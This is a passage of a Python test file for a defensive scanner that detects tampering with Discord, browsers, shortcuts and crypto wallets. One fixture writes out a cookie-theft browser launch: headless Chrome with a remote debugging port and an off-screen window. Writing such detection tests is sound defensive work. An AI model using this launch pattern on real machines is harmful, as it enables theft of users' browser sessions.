        ("AEG-TAMPER-BROWSER-PROC", CheckStatus.PASS), ("AEG-TAMPER-WALLET", CheckStatus.SKIP)]


def test_one_failing_check_does_not_stop_the_others(ctx, tmp_path, monkeypatch):
    fake_world(tmp_path, monkeypatch)

    def boom(*a, **k):
        raise RuntimeError("discovery exploded")

    monkeypatch.setattr(at, "find_discord_files", boom)
    monkeypatch.setattr(at, "collect_browser_processes", boom)
    findings, checks = split(list(at.AppTamperScanner().run(ctx)))
    status = {c.check_id: c for c in checks}
    assert status["AEG-TAMPER-DISCORD"].status == CheckStatus.ERROR and "discovery exploded" in status["AEG-TAMPER-DISCORD"].detail
    assert status["AEG-TAMPER-BROWSER-PROC"].status == CheckStatus.ERROR and "RuntimeError" in status["AEG-TAMPER-BROWSER-PROC"].detail
    assert status["AEG-TAMPER-ENV"].status == CheckStatus.FAIL and status["AEG-TAMPER-WALLET"].status == CheckStatus.FAIL
    assert {"AEG-TAMPER-ELECTRON-NODE", "AEG-TAMPER-LNK-DEBUG", "AEG-TAMPER-WALLET"} <= set(rules(findings))
    assert len(checks) == 5


def test_a_check_that_fails_midway_keeps_its_earlier_findings(ctx, tmp_path, monkeypatch):
    fake_world(tmp_path, monkeypatch)
    calls = {"n": 0}
    real = at.classify_shortcut

    def flaky(name, info):
        calls["n"] += 1
        if calls["n"] == 2:
            raise ValueError("bad shortcut")
        return real(name, info)

    monkeypatch.setattr(at, "classify_shortcut", flaky)
    findings, checks = split(list(at.AppTamperScanner().run(ctx)))
    c = next(x for x in checks if x.check_id == "AEG-TAMPER-SHORTCUTS")
    assert c.status == CheckStatus.ERROR and "ValueError" in c.detail
    assert "AEG-TAMPER-LNK-DEBUG" in rules(findings)  # reported before the failure


def test_scanner_stops_when_cancelled(ctx, tmp_path, monkeypatch):
    fake_world(tmp_path, monkeypatch)
    ctx.cancel.set()
    assert list(at.AppTamperScanner().run(ctx)) == []
    ctx.cancel.clear()

    def stop_at_shortcuts(scanner, msg):
        if "shortcuts" in msg:
            ctx.cancel.set()

    ctx.progress = stop_at_shortcuts
    out = list(at.AppTamperScanner().run(ctx))
    assert [c.check_id for c in out if isinstance(c, CheckResult)] == ["AEG-TAMPER-DISCORD", "AEG-TAMPER-ENV"]


def test_scanner_runs_for_real_on_this_machine(ctx):
    """No monkeypatching: whatever this machine has, the scan must finish with a result for every check and no ERROR."""
    out = list(at.AppTamperScanner().run(ctx))
    findings, checks = split(out)
    assert [c.check_id for c in checks] == ["AEG-TAMPER-DISCORD", "AEG-TAMPER-ENV", "AEG-TAMPER-SHORTCUTS",
                                            "AEG-TAMPER-BROWSER-PROC", "AEG-TAMPER-WALLET"]
    assert all(c.status != CheckStatus.ERROR for c in checks), [(c.check_id, c.detail) for c in checks]
    if sys.platform != "win32":
        assert {c.check_id: c.status for c in checks}["AEG-TAMPER-ENV"] == CheckStatus.SKIP
        assert {c.check_id: c.status for c in checks}["AEG-TAMPER-SHORTCUTS"] == CheckStatus.SKIP
    json.dumps([x.to_dict() for x in out])


def test_engine_runs_the_scanner(tmp_path):
    from aegis.core.engine import ScanEngine

    res = ScanEngine().scan("custom", ["apptamper"], paths=[tmp_path])
    assert res.scanners == ["apptamper"] and res.errors == []
    assert {c.check_id for c in res.checks if c.scanner == "apptamper"} >= {"AEG-TAMPER-DISCORD", "AEG-TAMPER-WALLET"}


def test_attack_ids_used_are_current_and_well_formed():
    """The ATT&CK ids this scanner emits (checked against the v20 enterprise matrix); retired ids are caught globally by
    tests/test_core.py::test_no_retired_attack_technique_ids."""
    current = {"T1554", "T1539", "T1218.015", "T1574", "T1547.009", "T1176.001", "T1557", "T1036", "T1185", "T1567"}
    source = (Path(at.__file__)).read_text(encoding="utf-8")
    used = set(re.findall(r"(?<![\w.])T1\d{3}(?:\.\d{3})?(?![.\d])", source))
    assert used == current, used ^ current


def test_realtime_process_guard_flags_cookie_theft_launches(tmp_path, monkeypatch):
    """The real-time process guard runs the same classifier on every new browser process (alert only, never auto-kill)."""
    from types import SimpleNamespace

    from aegis.core.config import Config
    from aegis.realtime import monitor as M

    monkeypatch.setenv("AEGIS_HOME", str(tmp_path))
    cfg = Config()
    cfg.notifications = False
    cfg.realtime_kill_malicious_processes = True
    events = []
    mon = M.RealtimeMonitor(cfg, SimpleNamespace(), on_event=events.append, components=())
    mon.ransomware.suspend_enabled = False
    pg = M.ProcessGuard(mon, sigma_rules=SimpleNamespace(match=lambda ev: []))
    monkeypatch.setattr(pg, "_scan_exe", lambda exe: [])
    monkeypatch.setattr(pg, "_scanner_findings", lambda info: [])
    exe = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
    base = {"pid": 2 ** 22 + 77, "name": "chrome.exe", "exe": exe, "ppid": 1, "parent_name": "evil.exe", "parent_exe": "",
            "parent_cmdline": "", "username": "PC\\bob", "create_time": 1.0}
    bad = dict(base, cmdline=[exe, "--headless", "--remote-debugging-port=9222", "--window-position=-32000,-32000"])
    findings = pg.handle(bad)
    assert [f.rule_id for f in findings] == ["AEG-TAMPER-BROWSER-DEBUG"] and findings[0].severity == Severity.HIGH
    f = findings[0]
    assert f.scanner == "realtime" and f.evidence["parent"] == "evil.exe" and f.remediation.action == "kill_process"
    assert not f.title.startswith("Blocked") and mon.stats["processes_killed"] == 0  # alert only
    assert [e.rule_id for e in events] == ["AEG-TAMPER-BROWSER-DEBUG"]
    assert pg.evaluate(dict(base, cmdline=[exe, "--profile-directory=Default"])) == []
    assert pg.evaluate(dict(base, cmdline=[exe, "--type=renderer", "--remote-debugging-port=9222", "--headless"])) == []
